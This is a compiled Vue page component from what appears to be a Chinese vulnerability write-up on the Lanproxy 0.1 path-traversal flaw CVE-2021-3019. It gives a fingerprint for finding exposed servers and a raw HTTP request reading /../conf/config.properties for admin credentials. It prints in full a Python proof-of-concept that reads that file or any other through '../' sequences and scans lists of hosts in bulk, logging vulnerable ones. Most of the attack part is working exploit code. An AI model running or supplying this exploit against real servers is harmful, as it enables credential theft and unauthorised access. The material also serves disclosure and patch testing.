import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c,a as n,b as t,d as p,e as s}from"./app-58e4a7d6.js";const l={},u=s(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持tcp流量转发，可支持任何tcp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面等等）本次Lanproxy 路径遍历漏洞 (CVE-2021-3019)通过../绕过读取任意文件。该漏洞允许目录遍历读取/../conf/config.properties来获取到内部网连接的凭据。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Lanproxy 0.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>header= &quot;Server: LPS-0.1&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2>`,7),r={href:"https://github.com/ffay/lanproxy/",target:"_blank",rel:"noopener noreferrer"},k=s(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>打开登录页面如下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101916095.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>使用Burp抓包发送如下请求</p><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code>GET /../conf/config.properties HTTP/1.1
Host: xxx.xxx.xxx.xxx
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101916819.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>成功在配置文件中读取 账号密码</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101916920.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>试着读取其他敏感文件</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101917016.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101917019.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2>`,12),d={href:"https://github.com/FanqXu/CVE-2021-3019/",target:"_blank",rel:"noopener noreferrer"},v=s(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token comment"># -*- encoding: utf-8 -*-</span>
<span class="token triple-quoted-string string">&#39;&#39;&#39;
@File    :   urllib.py
@Time    :   2021/01/10 21:59:32
@Author  :   _0xf4n9x_
@Version :   1.0
@Contact :   fanq.xu@gmail.com
@Desc    :   None
&#39;&#39;&#39;</span>


<span class="token keyword">import</span> sys
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> os
<span class="token keyword">from</span> urllib <span class="token keyword">import</span> request
<span class="token keyword">from</span> urllib <span class="token keyword">import</span> error

banner <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;
 ######  ##     ## ########     #######    #####    #######    ##       #######    #####    ##   #######  
##    ## ##     ## ##          ##     ##  ##   ##  ##     ## ####      ##     ##  ##   ## ####  ##     ## 
##       ##     ## ##                 ## ##     ##        ##   ##             ## ##     ##  ##  ##     ## 
##       ##     ## ###### ##### #######  ##     ##  #######    ## ##### #######  ##     ##  ##   ######## 
##        ##   ##  ##          ##        ##     ## ##          ##             ## ##     ##  ##         ## 
##    ##   ## ##   ##          ##         ##   ##  ##          ##      ##     ##  ##   ##   ##  ##     ## 
 ######     ###    ########    #########   #####   ######### ######     #######    #####  ###### #######  
                                                                                Author: _0xf4n9x_&quot;&quot;&quot;</span>

headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4080.0 Safari/537.36 Edg/82.0.453.0&quot;</span><span class="token punctuation">}</span>


<span class="token keyword">def</span> <span class="token function">readConf</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;
    默认读取配置文件，并通过能否读取配置文件来判断是否存在漏洞
    &quot;&quot;&quot;</span>
    config <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">&#39;config.server.bind&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;config.server.port&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;config.admin.username&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;config.admin.password&#39;</span>
    <span class="token punctuation">]</span>
    path <span class="token operator">=</span> <span class="token string">&quot;/../conf/config.properties&quot;</span>
    confUrl <span class="token operator">=</span> url <span class="token operator">+</span> path
    r <span class="token operator">=</span> request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>confUrl<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>r<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">as</span> resp<span class="token punctuation">:</span>
            confContent <span class="token operator">=</span> resp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">for</span> i <span class="token keyword">in</span> config<span class="token punctuation">:</span>
                <span class="token keyword">if</span> i <span class="token keyword">not</span> <span class="token keyword">in</span> confContent<span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] &quot;</span> <span class="token operator">+</span> url <span class="token operator">+</span> <span class="token string">&quot; is not vulnerable&quot;</span><span class="token punctuation">)</span>
                    <span class="token keyword">return</span> <span class="token string">&#39;Bye :(&#39;</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] &quot;</span> <span class="token operator">+</span> url <span class="token operator">+</span> <span class="token string">&quot; is vulnerable! :)&quot;</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> confContent
    <span class="token keyword">except</span> ConnectionResetError<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] &quot;</span> <span class="token operator">+</span> url <span class="token operator">+</span> <span class="token string">&quot; Connection reset by peer&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> error<span class="token punctuation">.</span>HTTPError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] &quot;</span> <span class="token operator">+</span> url <span class="token operator">+</span> e<span class="token punctuation">.</span>code <span class="token operator">+</span> e<span class="token punctuation">.</span>reason<span class="token punctuation">)</span>
    <span class="token keyword">except</span> error<span class="token punctuation">.</span>URLError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] &quot;</span> <span class="token operator">+</span> url <span class="token operator">+</span> e<span class="token punctuation">.</span>code <span class="token operator">+</span> e<span class="token punctuation">.</span>reason<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] &quot;</span> <span class="token operator">+</span> url <span class="token operator">+</span> <span class="token string">&quot; is not vulnerable&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0</span>


<span class="token keyword">def</span> <span class="token function">readOtherFile</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;
    读取任意其他文件
    &quot;&quot;&quot;</span>
    jumpSym <span class="token operator">=</span> <span class="token string">&quot;/../../../../../../../../..&quot;</span>
    fullUrl <span class="token operator">=</span> url <span class="token operator">+</span> jumpSym <span class="token operator">+</span> path
    r <span class="token operator">=</span> request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>fullUrl<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
    <span class="token keyword">with</span> request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>r<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">as</span> resp<span class="token punctuation">:</span>
        fileContent <span class="token operator">=</span> resp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>fileContent<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> path<span class="token operator">=</span><span class="token string">&quot;/../conf/config.properties&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>
        <span class="token comment"># if &#39;http&#39; not in url:</span>
        <span class="token comment">#     url = &#39;http://&#39; + url</span>
        url <span class="token operator">=</span> <span class="token string">&#39;http://&#39;</span> <span class="token operator">+</span> url<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;http://&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> path <span class="token operator">==</span> <span class="token string">&quot;/../conf/config.properties&quot;</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>readConf<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> readConf<span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">&#39;Bye :(&#39;</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                readOtherFile<span class="token punctuation">(</span>url<span class="token punctuation">,</span> path<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token keyword">as</span> target<span class="token punctuation">:</span>
            urls <span class="token operator">=</span> target<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">for</span> url <span class="token keyword">in</span> urls<span class="token punctuation">:</span>
                <span class="token comment"># if &#39;http&#39; not in url:</span>
                <span class="token comment">#     url = &#39;http://&#39; + url</span>
                url <span class="token operator">=</span> <span class="token string">&#39;http://&#39;</span> <span class="token operator">+</span> url<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;http://&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> readConf<span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">&#39;Bye :(&#39;</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;success.txt&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;a+&quot;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">&quot;\\n&quot;</span><span class="token punctuation">)</span>
            f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>
        description<span class="token operator">=</span><span class="token string">&quot;CVE-2021-3019 lanproxy arbitrary file read vulnerability detection POC&quot;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-u&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--url&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span>
                        <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;test a single website&quot;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-r&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--read&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span>
                        <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;this parameter is followed by the file name to be read, the configuration file is read by default&quot;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-f&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--file&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span>
                        <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;perform vulnerability checks on multiple websites in a file, and the vulnerable websites will be output to the success.txt file&quot;</span><span class="token punctuation">)</span>
    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">:</span>
        parser<span class="token punctuation">.</span>print_help<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">&#39;-u&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--url&#39;</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>
            run<span class="token punctuation">(</span>args<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
        <span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">:</span>
            run<span class="token punctuation">(</span>args<span class="token punctuation">.</span>url<span class="token punctuation">,</span> args<span class="token punctuation">.</span>read<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">&#39;-f&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--file&#39;</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        run<span class="token punctuation">(</span>args<span class="token punctuation">.</span><span class="token builtin">file</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>banner<span class="token punctuation">)</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202101917292.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="" tabindex="-1"><a class="header-anchor" href="#" aria-hidden="true">#</a></h2>`,3);function m(b,g){const a=o("ExternalLinkIcon");return i(),c("div",null,[u,n("p",null,[n("a",r,[t("https://github.com/ffay/lanproxy/"),p(a)])]),k,n("p",null,[n("a",d,[t("Github:CVE-2021-3019"),p(a)])]),v])}const y=e(l,[["render",m],["__file","Lanproxy 目录遍历漏洞 CVE-2021-3019.html.vue"]]);export{y as default};
